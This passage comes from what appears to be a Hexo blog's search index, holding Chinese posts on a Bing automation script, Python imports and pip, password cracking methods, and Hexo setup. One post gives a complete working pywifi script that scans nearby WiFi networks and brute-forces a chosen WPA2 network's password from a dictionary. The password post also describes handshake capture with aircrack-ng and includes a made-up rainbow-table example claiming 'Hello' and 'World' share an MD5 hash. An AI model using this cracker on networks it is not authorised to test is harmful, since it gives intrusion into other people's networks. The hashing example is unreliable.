class="line">    time.sleep(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">### 移动端方法二，不完善</span></span><br><span class="line">driver = webdriver.Edge()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 打开Bing搜索页面（PC端）</span></span><br><span class="line">driver.get(<span class="string">&#x27;https://www.bing.com&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 等待一段时间以确保页面加载完成</span></span><br><span class="line">time.sleep(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 在浏览器中打开开发者工具</span></span><br><span class="line">pyautogui.press(<span class="string">&#x27;f12&#x27;</span>)</span><br><span class="line">time.sleep(<span class="number">2</span>)  <span class="comment"># 等待开发者工具打开</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 模拟 Ctrl+Shift+M 快捷键以切换到移动设备模式</span></span><br><span class="line">pyautogui.hotkey(<span class="string">&#x27;ctrl&#x27;</span>, <span class="string">&#x27;shift&#x27;</span>, <span class="string">&#x27;m&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">driver.quit()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 脚本 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python基础学习(二)</title>
      <link href="/2023/11/19/python/pylearn(2)/"/>
      <url>/2023/11/19/python/pylearn(2)/</url>
      
        <content type="html"><![CDATA[<h2 id="Python导入"><a href="#Python导入" class="headerlink" title="Python导入"></a>Python导入</h2><p>from A import *<br>from B import *</p><p>c()<br>在这种情况下，如果 A 和 B 都有同名的方法 c，则会调用最后导入的模块 B 中的方法 c。因为后导入的模块会覆盖先导入的模块中的同名项。</p><p>为了避免命名冲突和不确定性，最好是明确地导入需要使用的方法，而不是使用通配符导入整个模块。例如：<br>from A import c as c_from_A<br>from B import c as c_from_B</p><p>c_from_A()  # 调用模块 A 中的方法 c<br>c_from_B()  # 调用模块 B 中的方法 c</p><p>在 Python 中，as 关键字用于给导入的模块、类、函数或方法指定一个别名。当你使用 as 关键字时，你可以为导入的项指定一个新的名称，以便在代码中更方便地引用它们。</p>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>python基础学习(一)</title>
      <link href="/2023/11/19/python/pylearn(1)/"/>
      <url>/2023/11/19/python/pylearn(1)/</url>
      
        <content type="html"><![CDATA[<h2 id="pip"><a href="#pip" class="headerlink" title="pip"></a>pip</h2><h4 id="pip-install"><a href="#pip-install" class="headerlink" title="pip install"></a>pip install</h4><p>pip install 是 Python 中用于安装第三方库和软件包的命令。pip 是 Python 的官方包管理器，它允许你轻松地浏览、安装和管理各种 Python 包。</p><p>当你运行 pip install <package_name> 命令时，它会连接到 Python 包索引（PyPI，Python Package Index），在索引中查找指定的包，并自动下载和安装该包及其依赖项。<br>具体而言，pip install 命令的作用是：</p><p>1.连接到 PyPI 或其他配置的包索引源。<br>2.在包索引中搜索指定的包名（<package_name>）。<br>3.下载找到的包及其依赖项（如果有）。<br>4.将这些包安装到你的 Python 环境中，使你能够在代码中导入和使用这些包。</p><h4 id="pip-uninstall"><a href="#pip-uninstall" class="headerlink" title="pip uninstall"></a>pip uninstall</h4><p>卸载包及其相关依赖。<br>当使用 pip uninstall package_name 卸载一个包时，pip 将会删除该包及其直接依赖关系。然而，pip 不会自动删除其他项目中使用的相同依赖项。</p><p>例如，假设我有两个项目 A 和 B，它们都依赖于相同的包 X。如果你在项目 A 中安装了包 X，并为其安装了一些额外的依赖项，然后在项目 B 中卸载了包 X，那么包 X 将会被卸载，但它的额外依赖项在项目 A 中不会被自动删除。</p><p>这是因为 pip 不会跟踪依赖项的使用情况。它只负责管理直接安装的包及其依赖项。如果你不再需要某个包及其依赖项，你可以手动使用 pip uninstall 卸载它们。</p><h4 id="pip-list"><a href="#pip-list" class="headerlink" title="pip list"></a>pip list</h4><p>列出已经安装的包</p><h2 id="终端命令如何执行"><a href="#终端命令如何执行" class="headerlink" title="终端命令如何执行"></a>终端命令如何执行</h2><p>pip 命令解析：终端将解析你输入的命令，并将其识别为 pip 命令。</p><p>包索引连接：pip 将连接到默认的包索引源（通常是 PyPI，Python Package Index）(<a href="https://pypi.org/)%E6%88%96%E4%BD%A0%E9%85%8D%E7%BD%AE%E7%9A%84%E8%87%AA%E5%AE%9A%E4%B9%89%E5%8C%85%E7%B4%A2%E5%BC%95%E6%BA%90%E3%80%82%E8%BF%99%E4%B8%AA%E5%8C%85%E7%B4%A2%E5%BC%95%E6%BA%90%E5%AD%98%E5%82%A8%E4%BA%86%E5%90%84%E7%A7%8D">https://pypi.org/)或你配置的自定义包索引源。这个包索引源存储了各种</a> Python 包的信息。</p><p>包搜索：pip 在包索引中搜索指定的包名（<package_name>）。它会查找包名、版本号和依赖关系等相关信息。</p><p>依赖项解析：如果找到了指定的包，pip 将分析该包的依赖关系，并确定需要安装的其他依赖包。它会检查这些依赖包是否已经安装，如果没有，将继续下载和安装这些依赖包。</p><p>包下载和安装：一旦确定需要安装的包及其依赖项，pip 将开始下载这些包的压缩文件（通常是 .tar.gz 或 .whl 格式）。下载完成后，pip 会解压这些文件，并将包的文件和目录结构复制到适当的位置，使其可供 Python 解释器使用。</p><p>安装完成：当所有包及其依赖项都成功下载、解压和复制到适当位置后，pip 安装过程就完成了。此时，你就可以在你的 Python 代码中导入和使用这些包了。</p>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Python破解wifi密码</title>
      <link href="/2023/11/19/python/wificracker/"/>
      <url>/2023/11/19/python/wificracker/</url>
      
        <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>只要自己的密码足够独特，就不必担心自己的密码被字典破解。<br>本程序仅仅是作者为了满足自己的恶趣味。</p><h3 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h3><p>大体思路是搜寻附近的wifi信号，选择wifi，然后跑密码字典进行破解。<br>为此，我需要编写两个类。一个是扫描wifi，一个是破解wifi.</p><h3 id="程序"><a href="#程序" class="headerlink" title="程序"></a>程序</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pywifi</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> pywifi <span class="keyword">import</span> const</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">WiFiScanner</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.wifi = pywifi.PyWiFi()</span><br><span class="line">        self.interface = self.wifi.interfaces()[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">scan</span>(<span class="params">self</span>):</span><br><span class="line">        self.interface.scan()</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">            time.sleep(<span class="number">1</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;\r扫描可用 WiFi 中，请稍后...（<span class="subst">&#123;<span class="number">3</span> - i&#125;</span>）&#x27;</span>, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;\r扫描完成!\n&#x27;</span> + <span class="string">&#x27;-&#x27;</span> * <span class="number">38</span>)</span><br><span class="line">        bss = self.interface.scan_results()</span><br><span class="line">        wifi_list = <span class="built_in">sorted</span>(</span><br><span class="line">            &#123;(<span class="number">100</span> + w.signal, w.ssid.encode(<span class="string">&#x27;raw_unicode_escape&#x27;</span>).decode(<span class="string">&#x27;utf-8&#x27;</span>)) <span class="keyword">for</span> w <span class="keyword">in</span> bss&#125;,</span><br><span class="line">            key=<span class="keyword">lambda</span> a: a[<span class="number">0</span>],</span><br><span class="line">            reverse=<span class="literal">True</span></span><br><span class="line">        )</span><br><span class="line">        self.display_wifi_list(wifi_list)</span><br><span class="line">        <span class="keyword">return</span> wifi_list</span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">display_wifi_list</span>(<span class="params">wifi_list</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;\r&#123;:4&#125;&#123;:6&#125;&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="string">&#x27;编号&#x27;</span>, <span class="string">&#x27;信号强度&#x27;</span>, <span class="string">&#x27;wifi名&#x27;</span>))</span><br><span class="line">        <span class="keyword">for</span> num, (signal, ssid) <span class="keyword">in</span> <span class="built_in">enumerate</span>(wifi_list):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;\r<span class="subst">&#123;num:&lt;6d&#125;</span><span class="subst">&#123;signal:&lt;8d&#125;</span><span class="subst">&#123;ssid&#125;</span>&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;-&#x27;</span> * <span class="number">38</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">WiFiCracker</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, interface</span>):</span><br><span class="line">        self.interface = interface</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">crack</span>(<span class="params">self, wifi_name, dictionary_path</span>):</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(dictionary_path, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            <span class="keyword">for</span> pwd <span class="keyword">in</span> f:</span><br><span class="line">                pwd = pwd.strip(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">                self.interface.disconnect()</span><br><span class="line">                <span class="keyword">while</span> self.interface.status() == const.IFACE_CONNECTED:</span><br><span class="line">                    <span class="keyword">pass</span></span><br><span class="line">                profile = pywifi.Profile()</span><br><span class="line">                profile.ssid = wifi_name</span><br><span class="line">                profile.auth = const.AUTH_ALG_OPEN</span><br><span class="line">                profile.akm.append(const.AKM_TYPE_WPA2PSK)</span><br><span class="line">                profile.cipher = const.CIPHER_TYPE_CCMP</span><br><span class="line">                profile.key = pwd</span><br><span class="line">                self.interface.remove_all_network_profiles()</span><br><span class="line">                tmp_profile = self.interface.add_network_profile(profile)</span><br><span class="line">                self.interface.connect(tmp_profile)</span><br><span class="line">                start_time = time.time()</span><br><span class="line">                <span class="keyword">while</span> time.time() - start_time &lt; <span class="number">1.5</span>:</span><br><span class="line">                    <span class="keyword">if</span> self.interface.status() == const.IFACE_CONNECTED:</span><br><span class="line">                        <span class="built_in">print</span>(<span class="string">f&#x27;\r连接成功！密码为：<span class="subst">&#123;pwd&#125;</span>&#x27;</span>)</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        <span class="built_in">print</span>(<span class="string">f&#x27;\r正在利用密码 <span class="subst">&#123;pwd&#125;</span> 尝试破解。&#x27;</span>, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Main</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.scanner = WiFiScanner()</span><br><span class="line">        self.cracker = WiFiCracker(self.scanner.interface)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;WiFi万能钥匙&#x27;</span>.center(<span class="number">35</span>, <span class="string">&#x27;-&#x27;</span>))</span><br><span class="line">        wifi_list = self.scanner.scan()</span><br><span class="line">        target_num = self.get_user_input(</span><br><span class="line">            <span class="string">&#x27;请选择你要尝试破解的wifi：&#x27;</span>,</span><br><span class="line">            <span class="built_in">range</span>(<span class="built_in">len</span>(wifi_list))</span><br><span class="line">        )</span><br><span class="line">        dictionary_path = <span class="built_in">input</span>(<span class="string">&quot;请输入本地用于WIFI暴力破解的密码字典（txt格式，每个密码占据1行）的路径：&quot;</span>)</span><br><span class="line">        self.cracker.crack(wifi_list[target_num][<span class="number">1</span>], dictionary_path)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;-&#x27;</span> * <span class="number">38</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_user_input</span>(<span class="params">prompt, valid_choices</span>):</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                user_input = <span class="built_in">int</span>(<span class="built_in">input</span>(prompt))</span><br><span class="line">                <span class="keyword">if</span> user_input <span class="keyword">in</span> valid_choices:</span><br><span class="line">                    <span class="keyword">return</span> user_input</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&#x27;无效输入，请重新输入。&#x27;</span>)</span><br><span class="line">            <span class="keyword">except</span> ValueError:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;只能输入数字哦o(*￣︶￣*)o&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main = Main()</span><br><span class="line">    main.run()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 密码破译 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>密码</title>
      <link href="/2023/11/16/hash/"/>
      <url>/2023/11/16/hash/</url>
      
        <content type="html"><![CDATA[<p>我在学python的时候写了一个生成随机密码的程序，突发奇想加了一个猜测密码的功能，运行了几次后感觉不尽人意，于是趁机了解了一下密码破译。</p><p>密码破译有三种方法：暴力破解，字典破解，彩虹表。</p><h3 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h3><p>暴力破解是一种尝试穷举所有可能的密码组合的方法。攻击者通过使用所有可能的字符组合（包括字母、数字和特殊字符），逐个尝试每个可能的密码，直到找到匹配的密码或尝<br>试完所有可能的组合。</p><p>用一个词来简洁概括，嗯猜。</p><p>但我要是这样，那么阁下该如何应对。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">characters = string.ascii_letters + string.digits + string.punctuation</span><br><span class="line"></span><br><span class="line">length = <span class="number">8</span></span><br><span class="line"></span><br><span class="line">password = <span class="string">&quot;&quot;</span>.join(random.sample(characters, length))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(password)</span><br></pre></td></tr></table></figure><p>string.ascii_letters 包含所有的 ASCII 字母，即包括大写字母和小写字母，共 52 个字符。</p><p>string.digits 包含所有的数字，共 10 个字符。</p><p>string.punctuation 包含所有的标点符号，共 32 个字符。</p><p>因此，characters 字符串总共有 52 + 10 + 32 &#x3D; 94 个字符。</p><p>对于长度为 8 的密码，总共的选择数量为 94 的 8 次方（94^8），即：</p><p>94^8 ≈ 6,095,689,385,410,816</p><p>这是不现实的。</p><h3 id="字典破解"><a href="#字典破解" class="headerlink" title="字典破解"></a>字典破解</h3><p>字典攻击是一种基于预先准备好的字典或词典的密码破解方法。这个字典包含了常见的单词、短语、常用密码以及其他可能的密码组合。攻击者会使用这个字典中的密码依次尝<br>试，直到找到匹配的密码或尝试完整个字典。<br>一种是使用kali系统配合无线网卡抓取握手包进行破解，另一种是直接编写程序跑密码字典进行破解，两者本质是相同的。<br>下面介绍kali破解</p><p>1.监听和抓取握手包（Handshake Capture）：<br>使用Kali Linux中的工具，如aircrack-ng、Wireshark或tcpdump，可以监听Wi-Fi网络流量，并抓取包含握手信息的数据包。这些握手包是连接到Wi-Fi网络所需的安全密钥信息。</p><p>2.构建密码字典（Password Dictionary）：<br>密码字典是一个包含多个密码短语的文本文件，用于尝试破解握手包中的密码。密码字典可以包含常见密码、常用单词、数字组合、特殊字符等。您可以使用现有的密码字典或创建自己的定制字典。</p><p>3.密码破解（Password Cracking）：<br>使用Kali Linux中的工具，如aircrack-ng、hashcat或John the Ripper，将抓取的握手包和密码字典进行结合，尝试对密码进行破解。这些工具将逐个尝试密码字典中的密码短语，并与抓取的握手包进行比对，以找到匹配的密码。</p><p>需要一本好的密码字典，我可没有。</p><h3 id="彩虹表"><a href="#彩虹表" class="headerlink" title="彩虹表"></a>彩虹表</h3><p>彩虹表（Rainbow Table）是一种用于加密密码破解的预先计算的数据结构。它是一种优化技术，旨在加速密码破解过程。</p><p>彩虹表的原理是通过对密码哈希函数的反向计算，以及预先计算并存储哈希值与对应密码之间的映射关系。使用彩虹表可以在较短的时间内找到密码的原始明文，而无需逐个尝试所有可能的密码组合。</p><p>彩虹表是利用哈希碰撞来破解密码的。</p><p>假设我使用MD5对明文进行哈希运算，密码设置为’Hello’,得到的哈希值(“Hello”) &#x3D; 5d41402abc4b2a76b9719d911017c592。</p><p>我可以在彩虹表中查询截获的哈希值，MD5(“Hello”) &#x3D; 5d41402abc4b2a76b9719d911017c592<br>MD5(“World”) &#x3D; 5d41402abc4b2a76b9719d911017c592</p><p>如果没有使用盐或者迭代的话，我可以使用’World’进行登录。</p><p>但MD5已经被证明不安全了，现在使用的是SHA-256，再加上盐和迭代，彩虹表破译也不太现实了。</p><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>暴力破解确实时间复杂度太高,不太实际。字典破解需要充分的字典库支持。彩虹表也存在被迭代哈希函数和加盐技术限制的问题。</p><p>开发者还可以通过限制登录尝试次数、账号锁定、使用验证码等手段进一步提高难度。</p><p>道高一尺魔高一丈，总会有办法的。</p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 密码破译 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2023/11/16/hello-world/"/>
      <url>/2023/11/16/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
